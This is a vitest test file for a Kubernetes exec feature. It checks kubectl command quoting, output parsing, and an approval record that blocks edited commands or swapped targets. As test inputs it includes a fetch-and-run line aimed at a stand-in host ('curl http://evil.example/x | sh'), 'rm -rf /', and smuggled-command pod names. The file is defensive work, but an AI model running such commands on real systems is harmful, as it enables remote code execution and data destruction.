import { describe, it, expect } from 'vitest'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'

import {
  buildK8sExecCommand,
  classifyK8sFailure,
  parseK8sExecResult,
  planK8sExec,
  K8S_EXEC_OUTPUT_CAP,
  K8S_FAILURE_HELP,
  type K8sExecTarget
} from '../src/shared/kubernetes'
import { approvalFor } from '../src/shared/broadcast'
import { KubernetesReader } from '../src/main/services/kubernetes'

// Roadmap item 22, part three. The file's original refusal named the
// precondition — "it belongs behind the same approval model broadcast has
// rather than a button next to a pod name" — and this is that precondition met.
//
// Fixtures recorded from a real kind cluster on v1.33: a two-container busybox
// pod for the successes, a `registry.k8s.io/pause` container for the case where
// there is no shell, and impersonation for the RBAC denial.
const fixture = (name: string): string =>
  readFileSync(join(__dirname, 'fixtures', 'k8s', name), 'utf8')

const target = (o: Partial<K8sExecTarget> = {}): K8sExecTarget => ({
  serverId: 's1',
  serverName: 'kube-jump',
  namespace: 'shop',
  pod: 'toolbox',
  container: 'shell',
  command: 'id',
  context: 'kind-spk8s',
  ...o
})

describe('building the exec line', () => {
  it('puts every kubectl flag on the near side of the --', () => {
    // The bug this test was written against, found by running it: `call()`
    // appends --request-timeout to the END of the argument list, and everything
    // after `--` belongs to the container. The flag arrived inside the pod as
    // sh's $0 and the recorded answer was
    //   --request-timeout=10s: line 0: echo "…"; id: not found
    const cmd = buildK8sExecCommand(target())
    const sep = cmd.indexOf(' -- ')
    expect(sep).toBeGreaterThan(0)
    expect(cmd.slice(sep)).not.toContain('--request-timeout')
    expect(cmd.slice(sep)).not.toContain('--namespace')
    expect(cmd.slice(0, sep)).toContain('--request-timeout=10s')
    expect(cmd.slice(0, sep)).toContain('--namespace=shop')
    expect(cmd.slice(0, sep)).toContain('--container=shell')
  })

  it('quotes the command exactly once', () => {
    // The other half of the same bug. kubectl hands `-c <arg>` to the container
    // as a single argv element with no shell in between, so a second layer of
    // quoting is a literal pair of quote characters that /bin/sh reads as part
    // of the command name.
    const cmd = buildK8sExecCommand(target({ command: 'echo hi' }))
    expect(cmd).toContain(`-c 'echo hi'`)
    expect(cmd).not.toContain(`-c ''\\''echo hi'`)
  })

  it('survives a command full of quoting hazards', () => {
    const nasty = `echo "it's $HOME"; awk '{print $1}'`
    const cmd = buildK8sExecCommand(target({ command: nasty }))
    // Every embedded single quote closes, escapes and reopens. Nothing else in
    // a POSIX single-quoted string is special, so `$HOME` and the braces are
    // carried through untouched to the container's own shell.
    expect(cmd).toContain(`'echo "it'\\''s $HOME"; awk '\\''{print $1}'\\'''`)
  })

  it('never opens a TTY or stdin', () => {
    const cmd = buildK8sExecCommand(target())
    expect(cmd).not.toMatch(/\s-t\b/)
    expect(cmd).not.toMatch(/\s-i\b/)
    expect(cmd).not.toContain('--stdin')
    expect(cmd).not.toContain('--tty')
  })

  it('caps the output', () => {
    expect(buildK8sExecCommand(target())).toContain(`| head -c ${K8S_EXEC_OUTPUT_CAP}`)
  })

  it('omits --container when none was chosen', () => {
    expect(buildK8sExecCommand(target({ container: '' }))).not.toContain('--container')
  })

  it('refuses names it cannot prove safe, and an empty command', () => {
    expect(() => buildK8sExecCommand(target({ pod: 'a; rm -rf /' }))).toThrow(
      /invalid pod or namespace name/
    )
    expect(() => buildK8sExecCommand(target({ container: '$(id)' }))).toThrow(
      /invalid container name/
    )
    expect(() => buildK8sExecCommand(target({ command: '   ' }))).toThrow(/empty command/)
  })
})

describe('what came back from a real container', () => {
  it('carries the container’s own output, expansions and all', () => {
    const r = parseK8sExecResult(fixture('exec-ok.txt'), 0)
    expect(r.ok).toBe(true)
    // `$HOME` and a backticked `date` were expanded INSIDE the container, which
    // is the correct semantics and the reason quoting once is right: the host
    // shell must pass them through untouched.
    expect(r.output).toContain("it's /root and 2026 and 'quoted'")
    expect(r.output).toContain('uid=0(root) gid=0(root)')
    expect(r.containerExit).toBe(null)
  })

  it('an empty answer is a success, unlike a cordon', () => {
    // `touch /tmp/x` prints nothing and worked. A cordon that prints nothing
    // cannot have worked, which is why the two parsers read emptiness
    // differently.
    const r = parseK8sExecResult(fixture('exec-silent.txt'), 0)
    expect(r.ok).toBe(true)
    expect(r.output).toBe('')
  })

  it('a failing program is a successful exec, with its exit code kept', () => {
    // The distinction the field exists for. Neither of these lines is a kubectl
    // error, so collapsing them into a failure would report an RBAC-shaped
    // problem for a typo'd path — and hiding the code would make a command that
    // failed read as one that worked.
    const r = parseK8sExecResult(fixture('exec-nonzero.txt'), 0)
    expect(r.ok).toBe(true)
    expect(r.containerExit).toBe(1)
    expect(r.output).toContain("cat: can't open '/nope/missing': No such file or directory")
  })

  it('a container with no shell is its own answer, not a broken cluster', () => {
    // Recorded from a `registry.k8s.io/pause` container, which is what a
    // distroless image looks like from here. The runtime's sentence reads like
    // a broken node; it is an image that deliberately ships no /bin/sh.
    const r = parseK8sExecResult(fixture('exec-no-shell.txt'), 1)
    expect(r.ok).toBe(false)
    expect(r.reason).toBe('no-shell')
    expect(r.output).toContain('stat /bin/sh: no such file or directory')
    expect(K8S_FAILURE_HELP['no-shell']).toContain('distroless')
  })

  it('classifies the runtime’s no-shell sentence ahead of the kubeconfig rule', () => {
    // `no such file or directory` also appears in kubeconfig errors, and the
    // kubeconfig rule matches on path-shaped wordings. Getting the order wrong
    // sends somebody to look for a kubeconfig that is fine.
    const line =
      'error: Internal error occurred: error executing command in container: OCI runtime exec failed: exec failed: unable to start container process: exec: "/bin/sh": stat /bin/sh: no such file or directory'
    expect(classifyK8sFailure(line, 1)).toBe('no-shell')
  })

  it('a denied exec names the pods/exec subresource, not pods', () => {
    // The RBAC point the original refusal made, in the API server's own words:
    // exec is a separate subresource, so a token that reads every pod in the
    // cluster can hold no exec permission at all.
    const r = parseK8sExecResult(fixture('exec-forbidden.txt'), 1)
    expect(r.ok).toBe(false)
    expect(r.reason).toBe('forbidden')
    expect(r.detail).toContain('cannot create resource "pods/exec"')
  })
})

describe('how hard you have to press', () => {
  it('is always a typed word, with no cheap case', () => {
    // The opposite of the rollout's graded rule, and not a failure to grade. A
    // rollout restart is one known action; an exec is arbitrary code, and `ls`
    // and `rm -rf /` are the same request from here.
    for (const command of ['ls', 'rm -rf /', 'true']) {
      const p = planK8sExec(target({ command }))
      expect(p.confirmation).toEqual({ kind: 'type-to-confirm', phrase: 'EXEC' })
      expect(p.risk).toBe('destructive')
    }
  })

  it('says exec is its own RBAC subresource', () => {
    expect(planK8sExec(target()).reasons.join(' ')).toContain('its own RBAC subresource')
  })

  it('warns that an unnamed container is kubectl’s choice, not the user’s', () => {
    // On a pod with a sidecar, the default container is very often not the one
    // you meant, and the symptom is a command that ran fine and found nothing.
    expect(planK8sExec(target({ container: '' })).caveats.join(' ')).toContain(
      'often not the one you meant'
    )
    // And the warning is absent once a container IS named, because then it is
    // not true.
    expect(planK8sExec(target({ container: 'shell' })).caveats.join(' ')).not.toContain(
      'often not the one you meant'
    )
  })

  it('says this is not a shell session', () => {
    const c = planK8sExec(target()).caveats.join(' ')
    expect(c).toContain('no TTY and no stdin')
    expect(c).toContain('a program that waits for input will hang')
  })
})

describe('the approval is a record, not a boolean', () => {
  const cfg = {}
  const build = (
    reply: () => { ok: boolean; code?: number | null; stdout?: string }
  ): { reader: KubernetesReader; sent: string[] } => {
    const sent: string[] = []
    return {
      sent,
      reader: new KubernetesReader({
        exec: async (_c, command) => {
          sent.push(command)
          return reply()
        }
      })
    }
  }
  const ok = (): { ok: boolean; code: number; stdout: string } => ({
    ok: true,
    code: 0,
    stdout: fixture('exec-ok.txt')
  })
  const approvalOf = (t: K8sExecTarget) =>
    approvalFor({
      surface: 'k8s-exec',
      commands: [buildK8sExecCommand(t)],
      targets: [{ serverId: t.serverId, serverName: t.serverName }],
      plan: planK8sExec(t),
      phrase: 'EXEC',
      confirmedAt: 1_760_000_000_000
    })

  it('runs when the record matches what is about to run', async () => {
    const t = target()
    const { reader, sent } = build(ok)
    const r = await reader.exec(cfg, t, approvalOf(t))
    expect(r.ok).toBe(true)
    expect(sent).toHaveLength(1)
  })

  it('refuses with no approval at all, and sends nothing', async () => {
    const { reader, sent } = build(ok)
    const r = await reader.exec(cfg, target(), undefined)
    expect(r.ok).toBe(false)
    expect(r.detail).toContain('no usable approval record came with this run')
    expect(sent).toEqual([])
  })

  it('refuses a boolean dressed up as an approval', async () => {
    // The shape of guard this replaces. `true` is what a `confirmed` flag looks
    // like, and it carries no statement about WHAT was confirmed.
    const { reader, sent } = build(ok)
    const r = await reader.exec(cfg, target(), true)
    expect(r.ok).toBe(false)
    expect(sent).toEqual([])
  })

  it('refuses when the command was edited after the human answered', async () => {
    // The check a boolean cannot make. The record carries the command text, so
    // an exec approved as `id` and sent as `curl evil.example | sh` is a
    // comparison rather than an act of faith.
    const approved = approvalOf(target({ command: 'id' }))
    const { reader, sent } = build(ok)
    const r = await reader.exec(
      cfg,
      target({ command: 'curl http://evil.example/x | sh' }),
      approved
    )
    expect(r.ok).toBe(false)
    expect(r.detail).toContain('An edited command needs a fresh confirmation')
    expect(sent).toEqual([])
  })

  it('refuses when the pod was swapped under a matching command', async () => {
    const approved = approvalOf(target({ pod: 'toolbox' }))
    const { reader, sent } = build(ok)
    const r = await reader.exec(cfg, target({ pod: 'payments-7d9f8' }), approved)
    expect(r.ok).toBe(false)
    expect(r.detail).toContain('step 1 was approved as')
    expect(sent).toEqual([])
  })

  it('refuses when the server was swapped', async () => {
    const approved = approvalOf(target({ serverId: 's1', serverName: 'kube-jump' }))
    const { reader, sent } = build(ok)
    const r = await reader.exec(
      cfg,
      target({ serverId: 's2', serverName: 'prod-bastion' }),
      approved
    )
    expect(r.ok).toBe(false)
    expect(r.detail).toContain('prod-bastion')
    expect(r.detail).toContain('runs on nobody’s approval')
    expect(sent).toEqual([])
  })

  it('refuses an approval minted under a weaker confirmation', async () => {
    // A record that says a plain confirm was answered cannot authorise an
    // action that now demands a typed word.
    const t = target()
    const weak = approvalFor({
      surface: 'k8s-exec',
      commands: [buildK8sExecCommand(t)],
      targets: [{ serverId: t.serverId, serverName: t.serverName }],
      plan: { risk: 'destructive', confirmation: { kind: 'confirm' } },
      phrase: null,
      confirmedAt: 1_760_000_000_000
    })
    const { reader, sent } = build(ok)
    const r = await reader.exec(cfg, t, weak)
    expect(r.ok).toBe(false)
    expect(sent).toEqual([])
  })

  it('refuses an approval minted under a weaker risk', async () => {
    const t = target()
    const weak = approvalFor({
      surface: 'k8s-exec',
      commands: [buildK8sExecCommand(t)],
      targets: [{ serverId: t.serverId, serverName: t.serverName }],
      plan: { risk: 'elevated', confirmation: { kind: 'type-to-confirm', phrase: 'EXEC' } },
      phrase: 'EXEC',
      confirmedAt: 1_760_000_000_000
    })
    const { reader, sent } = build(ok)
    const r = await reader.exec(cfg, t, weak)
    expect(r.ok).toBe(false)
    expect(r.detail).toContain('held to the stricter reading')
    expect(sent).toEqual([])
  })

  it('hands the renderer the exact string the approval must be minted against', () => {
    // The two halves cannot be allowed to drift: an approval minted against
    // anything but this string is one verifyApproval refuses.
    const t = target()
    const reader = new KubernetesReader({ exec: async () => ({ ok: true }) })
    const { plan, command } = reader.execPlan(t)
    expect(command).toBe(buildK8sExecCommand(t))
    expect(plan.confirmation).toEqual({ kind: 'type-to-confirm', phrase: 'EXEC' })
  })

  it('the panel mints against the command the MAIN PROCESS built', () => {
    // A source assertion, the way tests/broadcastApproval.test.ts asserts the
    // broadcast panel's surface. The panel must not build its own command
    // string and approve that: two builders that agree today can drift, and the
    // one that runs is the main process's.
    const panel = readFileSync(
      join(__dirname, '..', 'src/renderer/src/components/kubernetes/KubernetesPanel.tsx'),
      'utf8'
    )
    expect(panel).toMatch(/const \{ plan, command \} = await b\.execPlan\(target\)/)
    expect(panel).toMatch(/surface: 'k8s-exec'/)
    expect(panel).toMatch(/commands: \[command\]/)
    // And it never calls buildK8sExecCommand itself.
    expect(panel).not.toContain('buildK8sExecCommand')
  })

  it('reports an unreachable server as an UNKNOWN outcome, not a failed command', async () => {
    const t = target()
    const { reader } = build(() => ({ ok: false }))
    const r = await reader.exec(cfg, t, approvalOf(t))
    expect(r.ok).toBe(false)
    expect(r.detail).toContain('may or may not have run inside the container')
  })
})
